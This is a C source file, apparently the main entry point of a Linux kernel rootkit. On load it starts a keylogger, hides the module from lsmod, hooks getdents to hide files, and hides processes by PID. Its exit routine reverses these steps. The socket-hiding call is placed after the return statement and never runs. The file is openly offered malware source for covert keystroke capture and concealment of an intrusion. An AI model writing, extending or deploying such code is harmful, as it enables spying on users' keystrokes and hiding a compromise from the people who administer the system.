#include "main.h"

/*by defult its load the module with all fetures running*/
/*
fetures such as:
1. keyloging
2. hide the module form lsmod
3. hide file by the name provide
4. hide tcp sockets by port 
*/
static int __init start_rootkit(void)
{
    int ret;
    //KEYLOGGER AND HIDE THE MODULE
    ret = run_keylogger();
    if (ret ==-1)
    {
        printk(KERN_ALERT "rk: keylogger could not load!");
        printk(KERN_ALERT "rk: could not  module hide himself!");
        return -1;
    }
    printk(KERN_ALERT "rk: keylogger load!");
    printk(KERN_ALERT "rk: module hide himself!");
    //HIDE FILE
    ret = getdents_hook_init();
    if (ret==-1)
    {
        printk(KERN_ALERT "rk: could not hide the file!");
        return -1;
    }
    printk(KERN_ALERT "rk: hide file secsessfully!");
    //PROCESS HIDE
    ret = process_hide();
    if (ret==-1)
    {
        printk(KERN_ALERT "rk: could not hide the process by the pid!");
        return -1;
    }
    printk(KERN_ALERT "rk: hide the proces!");
    return 0;
    ret = netstat_hide();



}
static void __exit remove_rootkit(void)
{
    stop_keylogger();
    netstat_unhide();
    remove_hook();
    process_unhide();
}
module_init(start_rootkit);
module_exit(remove_rootkit);